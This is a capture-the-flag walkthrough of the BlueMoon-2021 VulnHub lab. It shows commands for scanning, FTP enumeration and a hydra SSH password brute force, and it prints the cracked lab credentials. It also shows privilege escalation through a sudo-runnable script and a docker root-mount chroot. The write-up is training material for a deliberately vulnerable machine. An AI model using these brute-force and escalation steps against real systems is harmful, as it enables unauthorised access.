# 🔐 BlueMoon 2021 – VulnHub Walkthrough

## 📌 Overview
- Machine Name: BlueMoon-2021  
- Difficulty: Easy  
- Goal: Gain Root Access  
- Attacker Machine: Kali Linux  

---

## 🖥️ Network Setup
- Kali IP: 192.168.56.101  
- Target IP: 192.168.56.102  

### Network Discovery
netdiscover -r 192.168.56.0/24

![Network Discovery](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/e93fe41b8f9634b824f00d2311577fff71ef4045/bluemoon%201-1.png)
---

## 🔎 Enumeration

### Nmap Scan
nmap -sC -sV 192.168.56.102

Result:
- FTP (21)
- SSH (22)
- HTTP (80)

![Nmap](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/aabb81c59cbbadb0d0f3f04c18b6f849f622ca98/bluemoon%202.png)

---

## 🌐 Web Enumeration

Open:
http://192.168.56.102

![Homepage](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/cabacafa4561242673376445e330ce750d44bc98/bluemoon%20page.png)

Hidden directory:
 /hidden_text

![Hidden](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/8060cc2e6f19ac7679b6802eeaa58837b3e6f726/bluemoon%20maintenance.png)

QR Code:
![QR](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/5a86c54e1491ca5c2b6dbadb037d354cac2416f9/bluemoon%20qr.png)

---
### DIRECTORY BRUTEFORCE (GOBUSTER)
gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt

![Gobuster](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/37c6b7c9dadd2b5a1b590f2f087c24ab23b084e9/bluemoon%203.png)

---
## 📂 FTP Enumeration

ftp userftp@192.168.56.102

![FTP](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/34a5399b479092cfff5b75ae35b21a570cfb591c/bluemoon%204.png)

Files:
- information.txt
- p_lists.txt

![Files&Plists](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/0ea28f37be41ad58a2eeb0a36d2aa5e151d9bf7e/bluemoon%205.png)


---

## 🔑 Brute Force

hydra -l robin -P p_lists.txt ssh://192.168.56.102

![Hydra](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/87d4749227ddbd684ab71d42db61d2aa0f43453d/bluemoon%206.png)

Credentials:
robin : k4rv3ndh4nh4ck3r

---

## 🖥️ SSH Access & Privilege Check

ssh robin@192.168.56.102
sudo -l
cat user1.txt

![SSH](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/2a27a26437bb1be8c232c731e6ba4698f43aeccf/bluemoon%207.png)


---

## 🚀 Escalate to Jerry

sudo -u jerry /home/robin/project/feedback.sh

![Jerry](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/234f8ef23ec188102d8e926b482b15e26fae5312/bluemoon%208.png)

cat user2.txt

![User2](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/cc37adb95c0a0c71ad9a9001cd9ad91f4c80e75a/bluemoon%208-1.png)

---

## 👑 Root

id

![Root Access](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/d5a5b6ad27ce0ba451ce2443498d3f6d40f46b39/bluemoon%208-2.png)

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
whoami
cat /root/root.txt

![Root Flag](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/29d5623a7fcd6955b8059d45128655a490173998/bluemoon%208-3%20final.png)

---

## 🧠 Key Takeaways
- Weak passwords → brute force possible  
- FTP leak → sensitive files exposed  
- Sudo misconfiguration → privilege escalation  
- Docker group = root  

---

## 🛠️ Tools
- netdiscover  
- nmap  
- hydra  
- ftp  
- ssh  

---

## ✅ Conclusion
Successfully gained root by enumeration, credential attack, and privilege escalation.

🔥 End of Walkthrough
